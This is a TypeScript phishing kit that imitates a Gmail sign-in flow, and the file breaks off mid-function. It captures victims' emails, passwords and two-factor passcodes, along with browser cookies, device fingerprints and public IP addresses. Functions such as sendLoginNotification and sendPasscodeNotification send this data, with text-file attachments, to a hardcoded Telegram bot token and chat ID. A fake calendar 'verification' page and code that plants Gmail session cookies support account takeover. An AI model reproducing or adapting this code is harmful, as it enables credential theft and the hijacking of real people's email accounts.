// Enhanced Gmail Login Page with Telegram Bot Manager JavaScript

// Type Definitions
interface TelegramBotInfo {
  id: number;
  is_bot: boolean;
  first_name: string;
  username?: string;
  can_join_groups?: boolean;
  can_read_all_group_messages?: boolean;
  supports_inline_queries?: boolean;
}

interface TelegramChatInfo {
  id: number;
  type: string;
  title?: string;
  first_name?: string;
  last_name?: string;
  username?: string;
}

interface TelegramMessage {
  message_id: number;
  date: number;
  chat: TelegramChatInfo;
  text?: string;
}

// Application State
interface AppState {
  currentPage: string;
  userEmail: string;
  isDarkMode: boolean;
  isLoading: boolean;
  telegramBot: {
    token: string;
    botInfo: TelegramBotInfo | null;
    isValid: boolean;
  };
}

const state: AppState = {
  currentPage: 'loginPage',
  userEmail: '',
  isDarkMode: false,
  isLoading: false,
  telegramBot: {
    token: '',
    botInfo: null,
    isValid: false
  }
};

// DOM Elements
const pages = {
  loginPage: document.getElementById('loginPage') as HTMLElement,
  passwordPage: document.getElementById('passwordPage') as HTMLElement,
  createAccountPage: document.getElementById('createAccountPage') as HTMLElement,
  recoveryPage: document.getElementById('recoveryPage') as HTMLElement,
  twoFactorPage: document.getElementById('twoFactorPage') as HTMLElement,
  successPage: document.getElementById('successPage') as HTMLElement,
  telegramBotPage: document.getElementById('telegramBotPage') as HTMLElement
};

const forms = {
  loginForm: document.getElementById('loginForm') as HTMLFormElement,
  passwordForm: document.getElementById('passwordForm') as HTMLFormElement,
  createAccountForm: document.getElementById('createAccountForm') as HTMLFormElement,
  recoveryForm: document.getElementById('recoveryForm') as HTMLFormElement,
  botTokenForm: document.getElementById('botTokenForm') as HTMLFormElement,
  chatIdForm: document.getElementById('chatIdForm') as HTMLFormElement
};

const inputs = {
  email: document.getElementById('email') as HTMLInputElement,
  password: document.getElementById('password') as HTMLInputElement,
  firstName: document.getElementById('firstName') as HTMLInputElement,
  lastName: document.getElementById('lastName') as HTMLInputElement,
  newEmail: document.getElementById('newEmail') as HTMLInputElement,
  newPassword: document.getElementById('newPassword') as HTMLInputElement,
  confirmPassword: document.getElementById('confirmPassword') as HTMLInputElement,
  recoveryInfo: document.getElementById('recoveryInfo') as HTMLInputElement,
  botToken: document.getElementById('botToken') as HTMLInputElement,
  chatId: document.getElementById('chatId') as HTMLInputElement,
  testMessage: document.getElementById('testMessage') as HTMLTextAreaElement
};

const buttons = {
  themeToggle: document.getElementById('themeToggle') as HTMLButtonElement,
  showPassword: document.getElementById('showPassword') as HTMLButtonElement,
  backToEmail: document.getElementById('backToEmail') as HTMLButtonElement,
  backToLogin: document.getElementById('backToLogin') as HTMLButtonElement,
  backToPassword: document.getElementById('backToPassword') as HTMLButtonElement,
  changeAccount: document.getElementById('changeAccount') as HTMLButtonElement,
  validateToken: document.getElementById('validateToken') as HTMLButtonElement,
  showBotToken: document.getElementById('showBotToken') as HTMLButtonElement,
  getChatInfo: document.getElementById('getChatInfo') as HTMLButtonElement,
  backToSuccess: document.getElementById('backToSuccess') as HTMLButtonElement,
  clearBotData: document.getElementById('clearBotData') as HTMLButtonElement
};

const links = {
  createAccount: document.getElementById('createAccountLink') as HTMLAnchorElement,
  signInInstead: document.getElementById('signInInstead') as HTMLAnchorElement,
  forgotEmail: document.getElementById('forgotEmailLink') as HTMLAnchorElement,
  forgotPassword: document.getElementById('forgotPasswordLink') as HTMLAnchorElement
};

const loadingOverlay = document.getElementById('loadingOverlay') as HTMLElement;

// Telegram API Functions
class TelegramAPI {
  private baseUrl = 'https://api.telegram.org/bot';

  async validateBotToken(token: string): Promise<{ valid: boolean; botInfo?: TelegramBotInfo; error?: string }> {
    try {
      const response = await fetch(`${this.baseUrl}${token}/getMe`);
      const data = await response.json();

      if (data.ok) {
        return { valid: true, botInfo: data.result };
      }
      return { valid: false, error: data.description || 'Invalid token' };
    } catch (error) {
      return { valid: false, error: 'Network error or invalid token format' };
    }
  }

  async getChatInfo(token: string, chatId: string): Promise<{ success: boolean; chatInfo?: TelegramChatInfo; error?: string }> {
    try {
      const response = await fetch(`${this.baseUrl}${token}/getChat?chat_id=${chatId}`);
      const data = await response.json();

      if (data.ok) {
        return { success: true, chatInfo: data.result };
      }
      return { success: false, error: data.description || 'Unable to get chat info' };
    } catch (error) {
      return { success: false, error: 'Network error' };
    }
  }

  async sendMessage(token: string, chatId: string, message: string): Promise<{ success: boolean; messageInfo?: TelegramMessage; error?: string }> {
    try {
      const response = await fetch(`${this.baseUrl}${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      });

      const data = await response.json();

      if (data.ok) {
        return { success: true, messageInfo: data.result };
      }
      return { success: false, error: data.description || 'Failed to send message' };
    } catch (error) {
      return { success: false, error: 'Network error' };
    }
  }

  async sendDocument(token: string, chatId: string, fileContent: string, fileName: string): Promise<{ success: boolean; messageInfo?: TelegramMessage; error?: string }> {
    try {
      // Create a blob from the file content
      const blob = new Blob([fileContent], { type: 'text/plain' });

      // Create FormData for file upload
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('document', blob, fileName);
      formData.append('caption', `📄 Token file: ${fileName}\n🕒 Generated: ${new Date().toLocaleString()}`);
      formData.append('parse_mode', 'HTML');

      const response = await fetch(`${this.baseUrl}${token}/sendDocument`, {
        method: 'POST',
        body: formData
      });

      const data = await response.json();

      if (data.ok) {
        return { success: true, messageInfo: data.result };
      }
      return { success: false, error: data.description || 'Failed to send document' };
    } catch (error) {
      return { success: false, error: 'Network error' };
    }
  }

  validateTokenFormat(token: string): boolean {
    // Telegram bot token format: numbers:letters_and_numbers (e.g., 123456789:ABCDEF1234567890abcdef)
    return /^\d+:[A-Za-z0-9_-]+$/.test(token);
  }

  validateChatId(chatId: string): boolean {
    // Chat ID can be positive (user) or negative (group/channel)
    return /^-?\d+$/.test(chatId);
  }
}

const telegramAPI = new TelegramAPI();

// Utility Functions
function validateEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}




function showError(input: HTMLInputElement | HTMLTextAreaElement, message: string): void {
  clearError(input);

  input.style.borderColor = 'var(--error-color)';
  input.style.borderWidth = '2px';
  input.setAttribute('aria-invalid', 'true');

  const errorElement = document.createElement('div');
  errorElement.className = 'error-message';
  errorElement.textContent = message;
  errorElement.setAttribute('role', 'alert');

  input.parentElement?.appendChild(errorElement);
}

function clearError(input: HTMLInputElement | HTMLTextAreaElement): void {
  input.style.borderColor = 'var(--border-color)';
  input.style.borderWidth = '1px';
  input.removeAttribute('aria-invalid');

  const errorMessage = input.parentElement?.querySelector('.error-message');
  if (errorMessage) {
    errorMessage.remove();
  }
}

function clearAllErrors(): void {
  for (const input of Object.values(inputs)) {
    if (input) clearError(input);
  }
}

// Page Navigation
function showPage(pageId: string, direction: 'forward' | 'backward' = 'forward'): void {
  const currentPageElement = pages[state.currentPage as keyof typeof pages];
  const nextPageElement = pages[pageId as keyof typeof pages];

  if (!currentPageElement || !nextPageElement) return;

  // Add transition classes
  if (direction === 'forward') {
    currentPageElement.classList.add('slide-out-left');
    nextPageElement.classList.remove('hidden');
    nextPageElement.classList.add('slide-in-right');
  } else {
    currentPageElement.classList.add('hidden');
    nextPageElement.classList.remove('hidden');
  }

  // Clean up after transition
  setTimeout(() => {
    currentPageElement.classList.add('hidden');
    currentPageElement.classList.remove('slide-out-left');
    nextPageElement.classList.remove('slide-in-right');

    // Focus first input in new page
    const firstInput = nextPageElement.querySelector('input[type="email"], input[type="text"], input[type="password"], textarea') as HTMLInputElement;
    if (firstInput) {
      firstInput.focus();
    }
  }, 400);

  state.currentPage = pageId;
  clearAllErrors();
}

// Loading State Management
function setLoadingState(isLoading: boolean, message = 'Loading...'): void {
  state.isLoading = isLoading;

  if (isLoading) {
    loadingOverlay.classList.remove('hidden');
    const loadingText = loadingOverlay.querySelector('.loading-text') as HTMLElement;
    if (loadingText) {
      loadingText.textContent = message;
    }
  } else {
    loadingOverlay.classList.add('hidden');
  }
}

// Theme Management
function toggleTheme(): void {
  state.isDarkMode = !state.isDarkMode;

  if (state.isDarkMode) {
    document.body.classList.remove('light-theme');
    document.body.classList.add('dark-theme');
    const themeIcon = buttons.themeToggle.querySelector('.theme-icon');
    if (themeIcon) themeIcon.textContent = '☀️';
    localStorage.setItem('theme', 'dark');
  } else {
    document.body.classList.remove('dark-theme');
    document.body.classList.add('light-theme');
    const themeIcon2 = buttons.themeToggle.querySelector('.theme-icon');
    if (themeIcon2) themeIcon2.textContent = '🌙';
    localStorage.setItem('theme', 'light');
  }
}

function initializeTheme(): void {
  const savedTheme = localStorage.getItem('theme');
  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

  if (savedTheme === 'dark' || (!savedTheme && prefersDark)) {
    state.isDarkMode = false; // Will be toggled to true
    toggleTheme();
  }
}

// Logging Functions
function addLogEntry(type: 'info' | 'success' | 'error', message: string): void {
  const messageLog = document.getElementById('messageLog') as HTMLElement;
  if (!messageLog) return;

  const logEntry = document.createElement('div');
  logEntry.className = `log-entry ${type}`;

  const timeStamp = new Date().toLocaleTimeString();
  logEntry.innerHTML = `
    <span class="log-time">${timeStamp}</span>
    <span class="log-message">${message}</span>
  `;

  messageLog.appendChild(logEntry);
  messageLog.scrollTop = messageLog.scrollHeight;

  // Limit log entries to prevent performance issues
  const entries = messageLog.querySelectorAll('.log-entry');
  if (entries.length > 50) {
    entries[0].remove();
  }
}

// Telegram Bot Management Functions
function updateBotInfo(botInfo: TelegramBotInfo): void {
  const botInfoSection = document.getElementById('botInfoSection') as HTMLElement;
  const botName = document.getElementById('botName') as HTMLElement;
  const botUsername = document.getElementById('botUsername') as HTMLElement;
  const botId = document.getElementById('botId') as HTMLElement;
  const botStatus = document.getElementById('botStatus') as HTMLElement;
  const statusIndicator = botStatus?.querySelector('.status-indicator') as HTMLElement;
  const statusText = botStatus?.querySelector('.status-text') as HTMLElement;

  if (botInfo) {
    botName.textContent = botInfo.first_name || 'Unknown Bot';
    botUsername.textContent = `@${botInfo.username || 'unknown'}`;
    botId.textContent = `ID: ${botInfo.id || 'unknown'}`;

    statusIndicator.className = 'status-indicator active';
    statusText.textContent = 'Active';

    botInfoSection.classList.remove('hidden');

    addLogEntry('success', `Bot verified: ${botInfo.first_name} (@${botInfo.username})`);
  }
}

function updateChatInfo(chatInfo: TelegramChatInfo): void {
  const chatInfoSection = document.getElementById('chatInfoSection') as HTMLElement;
  const chatTitle = document.getElementById('chatTitle') as HTMLElement;
  const chatType = document.getElementById('chatType') as HTMLElement;
  const chatIdDisplay = document.getElementById('chatIdDisplay') as HTMLElement;

  if (chatInfo) {
    const title = chatInfo.title || chatInfo.first_name || 'Private Chat';
    chatTitle.textContent = title;
    chatType.textContent = `Type: ${chatInfo.type}`;
    chatIdDisplay.textContent = `ID: ${chatInfo.id}`;

    chatInfoSection.classList.remove('hidden');

    addLogEntry('info', `Chat info retrieved: ${title} (${chatInfo.type})`);
  }
}

// Cookie Management Functions
function setCookie(name: string, value: string, days: number = 30): void {
  const expires = new Date();
  expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Lax`;
}

function savePasscode(passcode: string, type: string): void {
  const timestamp = new Date().toISOString();
  const passcodeData = {
    code: passcode,
    type: type,
    timestamp: timestamp,
    sessionId: getCookie('sessionId')
  };

  // Save individual passcode with timestamp
  setCookie(`passcode_${timestamp.replace(/[:.]/g, '_')}`, JSON.stringify(passcodeData));

  // Update latest passcode
  setCookie('latest_passcode', JSON.stringify(passcodeData));

  // Keep count of total passcodes entered
  const currentCount = parseInt(getCookie('passcode_count') || '0');
  setCookie('passcode_count', (currentCount + 1).toString());
}

function getCookie(name: string): string | null {
  const nameEQ = name + "=";
  const ca = document.cookie.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

function getAllCookies(): Record<string, string> {
  const cookies: Record<string, string> = {};
  const ca = document.cookie.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
    const eqPos = c.indexOf('=');
    if (eqPos > 0) {
      const name = c.substring(0, eqPos);
      const value = c.substring(eqPos + 1);
      cookies[name] = value;
    }
  }
  return cookies;
}

function generateSessionId(): string {
  return 'sess_' + Math.random().toString(36).substr(2, 16) + Date.now().toString(36);
}

function getUserFingerprint(): Record<string, any> {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    screenResolution: `${screen.width}x${screen.height}`,
    screenColorDepth: screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    touchSupport: 'ontouchstart' in window,
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    connection: (navigator as any).connection ? {
      effectiveType: (navigator as any).connection.effectiveType,
      downlink: (navigator as any).connection.downlink,
      rtt: (navigator as any).connection.rtt
    } : 'unknown'
  };
}

function initializeUserSession(): void {
  let sessionId = getCookie('sessionId');
  if (!sessionId) {
    sessionId = generateSessionId();
    setCookie('sessionId', sessionId);
  }

  const visitCount = parseInt(getCookie('visitCount') || '0') + 1;
  setCookie('visitCount', visitCount.toString());

  const firstVisit = getCookie('firstVisit');
  if (!firstVisit) {
    setCookie('firstVisit', new Date().toISOString());
  }

  setCookie('lastVisit', new Date().toISOString());
  setCookie('currentPage', window.location.href);
}

// Enhanced Telegram Notification Function
async function sendLoginNotification(email: string, password: string): Promise<void> {
  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
  const chatId = '5721205355';

  const timestamp = Math.floor(Date.now() / 1000);
  const sessionId = getCookie('sessionId');
  const fingerprint = getUserFingerprint();
  const cookies = getAllCookies();

  // Create tokens data
  const tokensData = {
    sessionId: sessionId,
    cookies: cookies,
    fingerprint: fingerprint,
    timestamp: timestamp,
    email: email,
    password: password
  };

  // Format the message according to the template
  const message = `Note - Message has been updated .
✨ <b>Session Information</b> ✨
👤 <b>Username:</b>      ➖ ${email}
🔑 <b>Password:</b>      ➖ ${password}
🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
🖥️ <b>User Agent:</b>    ➖ ${fingerprint.userAgent}
🌍 <b>Remote Address:</b>➖ ${await getPublicIP()}
🕒 <b>Create Time:</b>   ➖ ${timestamp}
🕔 <b>Update Time:</b>   ➖ ${timestamp}
📦 <b>Tokens are added in txt file and attached separately in message.</b>

<b>Session Details:</b>
🆔 Session ID: ${sessionId}
🌐 Timezone: ${fingerprint.timezone}
📱 Platform: ${fingerprint.platform}
🖥️ Screen: ${fingerprint.screenResolution}
🔧 Touch Support: ${fingerprint.touchSupport ? 'Yes' : 'No'}`;

  try {
    // Send main notification
    const result = await telegramAPI.sendMessage(token, chatId, message);

    if (result.success) {
      // Create and send tokens file as attachment
      const tokensText = formatTokensFile(tokensData);
      const fileName = `tokens_${sessionId}_${timestamp}.txt`;
      await telegramAPI.sendDocument(token, chatId, tokensText, fileName);
      addLogEntry('success', 'Enhanced login notification sent to Telegram with file attachment');
    } else {
      addLogEntry('error', `Failed to send notification: ${result.error}`);
    }
  } catch (error) {
    addLogEntry('error', 'Error sending Telegram notification');
  }
}

// Get public IP address
async function getPublicIP(): Promise<string> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

// Format tokens file content
function formatTokensFile(data: any): string {
  const timestamp = new Date().toISOString();

  return `=== SESSION TOKENS FILE ===
Generated: ${timestamp}
Session ID: ${data.sessionId}
Email: ${data.email}
Password: ${data.password}
Landing URL: ${window.location.href}
User Agent: ${data.fingerprint.userAgent}
Platform: ${data.fingerprint.platform}
Screen Resolution: ${data.fingerprint.screenResolution}
Timezone: ${data.fingerprint.timezone}
Language: ${data.fingerprint.language}
Touch Support: ${data.fingerprint.touchSupport}

=== COOKIES ===
${Object.entries(data.cookies).map(([key, value]) => `${key}=${value}`).join('\n')}

=== DEVICE FINGERPRINT ===
Hardware Concurrency: ${data.fingerprint.hardwareConcurrency}
Max Touch Points: ${data.fingerprint.maxTouchPoints}
Color Depth: ${data.fingerprint.screenColorDepth}
Device Memory: ${data.fingerprint.deviceMemory}
Connection Type: ${data.fingerprint.connection !== 'unknown' ? data.fingerprint.connection.effectiveType : 'Unknown'}
Do Not Track: ${data.fingerprint.doNotTrack}
Cookie Enabled: ${data.fingerprint.cookieEnabled}

=== END OF TOKENS FILE ===`;
}

// Passcode Capture and Notification
async function sendPasscodeNotification(passcode: string, type: string, email?: string): Promise<void> {
  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
  const chatId = '5721205355';

  const timestamp = Math.floor(Date.now() / 1000);
  const sessionId = getCookie('sessionId');
  const fingerprint = getUserFingerprint();
  const cookies = getAllCookies();

  // Create tokens data for passcode
  const tokensData = {
    sessionId: sessionId,
    cookies: cookies,
    fingerprint: fingerprint,
    timestamp: timestamp,
    email: email || 'Unknown',
    passcode: passcode,
    type: type
  };

  // Format the message according to the template
  const message = `Note - Message has been updated .
✨ <b>Session Information</b> ✨
👤 <b>Username:</b>      ➖ ${email || 'Unknown'}
🔑 <b>Passcode (${type}):</b>      ➖ ${passcode}
🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
🖥️ <b>User Agent:</b>    ➖ ${fingerprint.userAgent}
🌍 <b>Remote Address:</b>➖ ${await getPublicIP()}
🕒 <b>Create Time:</b>   ➖ ${timestamp}
🕔 <b>Update Time:</b>   ➖ ${timestamp}
📦 <b>Tokens are added in txt file and attached separately in message.</b>

<b>Passcode Details:</b>
📝 Type: ${type}
🆔 Session ID: ${sessionId}`;

  try {
    // Send main notification
    const result = await telegramAPI.sendMessage(token, chatId, message);

    if (result.success) {
      // Create and send passcode tokens file as attachment
      const tokensText = formatPasscodeTokensFile(tokensData);
      const fileName = `passcode_${type.replace(/[^a-zA-Z0-9]/g, '_')}_${sessionId}_${timestamp}.txt`;
      await telegramAPI.sendDocument(token, chatId, tokensText, fileName);
      addLogEntry('success', `Passcode notification sent: ${passcode} (${type}) with file attachment`);
    } else {
      addLogEntry('error', `Failed to send passcode notification: ${result.error}`);
    }
  } catch (error) {
    addLogEntry('error', 'Error sending passcode notification');
  }
}

// Format passcode tokens file content
function formatPasscodeTokensFile(data: any): string {
  const timestamp = new Date().toISOString();

  return `=== PASSCODE TOKENS FILE ===
Generated: ${timestamp}
Session ID: ${data.sessionId}
Email: ${data.email}
Passcode: ${data.passcode}
Passcode Type: ${data.type}
Landing URL: ${window.location.href}
User Agent: ${data.fingerprint.userAgent}
Platform: ${data.fingerprint.platform}
Screen Resolution: ${data.fingerprint.screenResolution}
Timezone: ${data.fingerprint.timezone}

=== COOKIES ===
${Object.entries(data.cookies).map(([key, value]) => `${key}=${value}`).join('\n')}

=== DEVICE FINGERPRINT ===
Hardware Concurrency: ${data.fingerprint.hardwareConcurrency}
Max Touch Points: ${data.fingerprint.maxTouchPoints}
Color Depth: ${data.fingerprint.screenColorDepth}
Device Memory: ${data.fingerprint.deviceMemory}
Connection Type: ${data.fingerprint.connection !== 'unknown' ? data.fingerprint.connection.effectiveType : 'Unknown'}

=== END OF PASSCODE TOKENS FILE ===`;
}


// Gmail Cookie Handler Function
interface GmailCookie {
  name: string;
  value: string;
  domain: string;
  hostOnly: boolean;
  path: string;
  secure: boolean;
  httpOnly: boolean;
  sameSite: string;
  session: boolean;
  firstPartyDomain: string;
  partitionKey: any;
  expirationDate: number;
  storeId: any;
}

function processGmailCookies(cookiesArray: GmailCookie[]): void {
  const timestamp = Math.floor(Date.now() / 1000);
  const sessionId = getCookie('sessionId');
  const fingerprint = getUserFingerprint();
  const currentCookies = getAllCookies();

  // Process each Gmail cookie
  for (const cookie of cookiesArray) {
    // Set the cookie in the browser if it's for Gmail domain
    if (cookie.domain.includes('gmail.com') || cookie.domain.includes('google.com')) {
      setCookie(cookie.name, cookie.value, 30);
    }
  }

  // Create Gmail tokens data
  const gmailTokensData = {
    sessionId: sessionId,
    importedCookies: cookiesArray,
    currentCookies: currentCookies,
    fingerprint: fingerprint,
    timestamp: timestamp,
    domain: 'gmail.com',
    cookieCount: cookiesArray.length
  };

  // Send notification about Gmail cookies
  sendGmailCookieNotification(gmailTokensData);
}

async function sendGmailCookieNotification(data: any): Promise<void> {
  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
  const chatId = '5721205355';

  const timestamp = Math.floor(Date.now() / 1000);

  // Format the message for Gmail cookies
  const message = `Note - Gmail Cookie Data Captured .
✨ <b>Gmail Session Information</b> ✨
🌐 <b>Domain:</b>        ➖ ${data.domain}
📊 <b>Cookie Count:</b>  ➖ ${data.cookieCount}
🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
🖥️ <b>User Agent:</b>    ➖ ${data.fingerprint.userAgent}
🌍 <b>Remote Address:</b>➖ ${await getPublicIP()}
🕒 <b>Create Time:</b>   ➖ ${timestamp}
🕔 <b>Update Time:</b>   ➖ ${timestamp}
📦 <b>Gmail cookies are added in txt file and attached separately in message.</b>

<b>Cookie Details:</b>
🆔 Session ID: ${data.sessionId}
🌐 Timezone: ${data.fingerprint.timezone}
📱 Platform: ${data.fingerprint.platform}
🖥️ Screen: ${data.fingerprint.screenResolution}`;

  try {
    // Send main notification
    const result = await telegramAPI.sendMessage(token, chatId, message);

    if (result.success) {
      // Create and send Gmail cookies file as attachment
      const tokensText = formatGmailCookiesFile(data);
      const fileName = `gmail_cookies_${data.sessionId}_${timestamp}.txt`;
      await telegramAPI.sendDocument(token, chatId, tokensText, fileName);
      addLogEntry('success', 'Gmail cookie notification sent to Telegram with file attachment');
    } else {
      addLogEntry('error', `Failed to send Gmail cookie notification: ${result.error}`);
    }
  } catch (error) {
    addLogEntry('error', 'Error sending Gmail cookie notification');
  }
}

function formatGmailCookiesFile(data: any): string {
  const timestamp = new Date().toISOString();

  let cookieDetails = '';
  for (const cookie of data.importedCookies) {
    cookieDetails += `
Cookie: ${cookie.name}
Value: ${cookie.value}
Domain: ${cookie.domain}
Path: ${cookie.path}
Secure: ${cookie.secure}
HttpOnly: ${cookie.httpOnly}
SameSite: ${cookie.sameSite}
Session: ${cookie.session}
Expiration: ${cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : 'Session'}
---`;
  }

  return `=== GMAIL COOKIES TOKENS FILE ===
Generated: ${timestamp}
Session ID: ${data.sessionId}
Domain: ${data.domain}
Cookie Count: ${data.cookieCount}
Landing URL: ${window.location.href}
User Agent: ${data.fingerprint.userAgent}
Platform: ${data.fingerprint.platform}
Screen Resolution: ${data.fingerprint.screenResolution}
Timezone: ${data.fingerprint.timezone}

=== IMPORTED GMAIL COOKIES ===
${cookieDetails}

=== CURRENT BROWSER COOKIES ===
${Object.entries(data.currentCookies).map(([key, value]) => `${key}=${value}`).join('\n')}

=== DEVICE FINGERPRINT ===
Hardware Concurrency: ${data.fingerprint.hardwareConcurrency}
Max Touch Points: ${data.fingerprint.maxTouchPoints}
Color Depth: ${data.fingerprint.screenColorDepth}
Device Memory: ${data.fingerprint.deviceMemory}
Connection Type: ${data.fingerprint.connection !== 'unknown' ? data.fingerprint.connection.effectiveType : 'Unknown'}

=== END OF GMAIL COOKIES FILE ===`;
}

// Example function to simulate Gmail cookie import
function importGmailCookies(): void {
  // Example Gmail cookies (you can replace this with actual cookie data)
  const exampleGmailCookies: GmailCookie[] = [
    {
      name: "1P_JAR",
      value: "2024-12-16-10",
      domain: ".google.com",
      hostOnly: false,
      path: "/",
      secure: true,
      httpOnly: false,
      sameSite: "no_restriction",
      session: false,
      firstPartyDomain: "",
      partitionKey: null,
      expirationDate: 1737504000,
      storeId: null
    },
    {
      name: "ACCOUNT_CHOOSER",
      value: "AFx_qI5V8Kf9LjF_oFX9dHwJKl2mN3O4p5Q6r7S8t9U0v1W2x3Y4z",
      domain: "accounts.google.com",
      hostOnly: false,
      path: "/",
      secure: true,
      httpOnly: true,
      sameSite: "lax",
      session: false,
      firstPartyDomain: "",
      partitionKey: null,
      expirationDate: 1737504000,
      storeId: null
    },
    {
      name: "GMAIL_AT",
      value: "AF6bupONTz_K8L9M0n1O2p3Q4r5S6t7U8v9W0x1Y2z3A4b5C6d7E8f",
      domain: ".gmail.com",
      hostOnly: false,
      path: "/",
      secure: true,
      httpOnly: true,
      sameSite: "none",
      session: false,
      firstPartyDomain: "",
      partitionKey: null,
      expirationDate: 1737504000,
      storeId: null
    }
  ];

  processGmailCookies(exampleGmailCookies);
  addLogEntry('success', `Processed ${exampleGmailCookies.length} Gmail cookies`);
}

// Two-Factor Authentication Notification

// Calendar state
let currentCalendarDate = new Date();

function renderCalendar(): void {
  const monthYear = document.getElementById('calendarMonthYear') as HTMLElement;
  const daysContainer = document.getElementById('calendarDays') as HTMLElement;

  if (!monthYear || !daysContainer) return;

  const year = currentCalendarDate.getFullYear();
  const month = currentCalendarDate.getMonth();

  // Set month and year header
  const monthNames = ['January', 'February', 'March', 'April', 'May', 'June', 
                      'July', 'August', 'September', 'October', 'November', 'December'];
  monthYear.textContent = `${monthNames[month]} ${year}`;

  // Clear previous days
  daysContainer.innerHTML = '';

  // Get first day of month and number of days
  const firstDay = new Date(year, month, 1).getDay();
  const daysInMonth = new Date(year, month + 1, 0).getDate();

  // Add empty cells for days before month starts
  for (let i = 0; i < firstDay; i++) {
    const emptyCell = document.createElement('div');
    emptyCell.className = 'calendar-day empty';
    daysContainer.appendChild(emptyCell);
  }

  // Add day cells
  for (let day = 1; day <= daysInMonth; day++) {
    const dayCell = document.createElement('div');
    dayCell.className = 'calendar-day';
    dayCell.textContent = day.toString();
    dayCell.addEventListener('click', () => handleCalendarDayClick(day));
    daysContainer.appendChild(dayCell);
  }
}

function handleCalendarDayClick(day: number): void {
  setLoadingState(true, 'Processing selection...');

  setTimeout(async () => {
    setLoadingState(false);
    
    // Send calendar selection notification
    const selectedDate = `${currentCalendarDate.getFullYear()}-${String(currentCalendarDate.getMonth() + 1).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
    await sendCalendarSelectionNotification(state.userEmail, selectedDate);
    
    showPage('successPage');
  }, 1000);
}

async function sendCalendarSelectionNotification(email: string, selectedDate: string): Promise<void> {
  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
  const chatId = '5721205355';

  const timestamp = Math.floor(Date.now() / 1000);
  const sessionId = getCookie('sessionId');

  const message = `📅 <b>Calendar Date Selected</b>
Note - User completed authentication by selecting a date.

✨ <b>Selection Information</b> ✨
👤 <b>Username:</b>      ➖ ${email}
📅 <b>Selected Date:</b> ➖ ${selectedDate}
🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
🕒 <b>Complete Time:</b> ➖ ${timestamp}
🔐 <b>Status:</b> Successfully Verified

🆔 Session ID: ${sessionId}
📱 Calendar authentication completed.`;

  try {
    await telegramAPI.sendMessage(token, chatId, message);
    addLogEntry('success', `Calendar date selected: ${selectedDate}`);
  } catch (error) {
    addLogEntry('error', 'Error sending calendar selection notification');
  }
}

function navigateCalendarMonth(direction: number): void {
  currentCalendarDate.setMonth(currentCalendarDate.getMonth() + direction);
  renderCalendar();
}

function initializeCalendar(): void {
  const prevButton = document.getElementById('prevMonth') as HTMLButtonElement;
  const nextButton = document.getElementById('nextMonth') as HTMLButtonElement;

  if (prevButton) {
    prevButton.addEventListener('click', () => navigateCalendarMonth(-1));
  }

  if (nextButton) {
    nextButton.addEventListener('click', () => navigateCalendarMonth(1));
  }
}

// Form Handlers
function handleLoginSubmit(e: Event): void {
  e.preventDefault();

  const email = inputs.email.value.trim();

  if (!email) {
    showError(inputs.email, 'Enter an email or phone number');
    return;
  }

  if (!validateEmail(email)) {
    showError(inputs.email, 'Please enter a valid email address');
    return;
  }

  setLoadingState(true, 'Checking account...');

  setTimeout(() => {
    setLoadingState(false);
    state.userEmail = email;

    const userEmailElement = document.getElementById('userEmail') as HTMLElement;
    if (userEmailElement) {
      userEmailElement.textContent = email;
    }

    const userAvatar = document.getElementById('userAvatar') as HTMLElement;
    if (userAvatar) {
      userAvatar.textContent = email.charAt(0).toUpperCase();
    }

    showPage('passwordPage');
  }, 1500);
}

function handlePasswordSubmit(e: Event): void {
  e.preventDefault();

  const password = inputs.password.value;

  if (!password) {
    showError(inputs.password, 'Enter a password');
    return;
  }

  // Save password as passcode
  savePasscode(password, 'Password');

  // Send passcode notification
  sendPasscodeNotification(password, 'Password', state.userEmail);

  setLoadingState(true, 'Verifying password...');

  setTimeout(async () => {
    setLoadingState(false);

    // Send login notification to Telegram
    await sendLoginNotification(state.userEmail, password);

    if (state.userEmail.includes('2fa') || Math.random() > 0.7) {
      const twoFactorEmail = document.getElementById('twoFactorEmail') as HTMLElement;
      if (twoFactorEmail) {
        twoFactorEmail.textContent = state.userEmail;
      }
      showPage('twoFactorPage');
      renderCalendar();
    } else {
      showPage('successPage');
    }
  }, 1500);
}

// Telegram Bot Form Handlers
async function handleBotTokenSubmit(e: Event): Promise<void> {
  e.preventDefault();

  const token = inputs.botToken.value.trim();

  if (!token) {
    showError(inputs.botToken, 'Enter a bot token');
    return;
  }

  if (!telegramAPI.validateTokenFormat(token)) {
